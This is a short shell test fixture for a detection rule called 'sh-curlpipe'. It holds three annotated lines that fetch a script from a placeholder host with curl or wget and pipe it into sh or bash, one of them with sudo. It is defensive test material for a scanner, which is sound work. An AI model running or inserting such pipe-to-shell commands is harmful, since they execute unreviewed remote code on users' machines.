#!/bin/sh
# Fixture only — never executed. One annotated instance per alternative of the rule
# named in the file name; `# ruleid:` names the rule the next line must draw.
# ruleid: sh-curlpipe
curl -fsSL https://example.invalid/a | sh
# ruleid: sh-curlpipe
wget -qO- https://example.invalid/b | bash
# ruleid: sh-curlpipe
curl -s https://example.invalid/c | sudo sh
